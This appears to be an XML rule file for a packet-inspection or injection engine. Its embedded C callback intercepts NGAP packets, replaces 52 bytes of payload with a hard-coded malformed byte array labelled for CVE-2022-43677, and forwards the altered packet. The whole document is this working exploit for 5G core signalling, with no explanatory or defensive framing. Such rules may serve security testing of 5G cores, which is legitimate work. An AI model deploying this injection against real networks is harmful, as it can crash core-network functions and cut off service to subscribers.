<beginning>

<embedded_functions><![CDATA[
      
void on_load(){

}

#define DATA_SIZE 52
static void em_modify_ngap_packet(
      const rule_info_t *rule, int verdict, uint64_t timestamp, 
      uint64_t counter, const mmt_array_t * const trace ){
	uint8_t malformed_data[] = {0x00, 0x28, 0x00, 0x30, 0x00, 0x30, 0x30, 0x00, 0x12, 0x00, 0x20, 0x37, 0x37, 0x00, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30};

	replace_data_at_protocol_id( PROTO_NGAP, DATA_SIZE, malformed_data );
	forward_packet();
}
]]></embedded_functions>

<property property_id="18" type_property="FORWARD" 
    description="CVE-2022-43677" if_satisfied="em_modify_ngap_packet">
    <event description="Got NGAP packet"
           boolean_expression="(ngap.packet_count > 0)"/>
</property>

</beginning>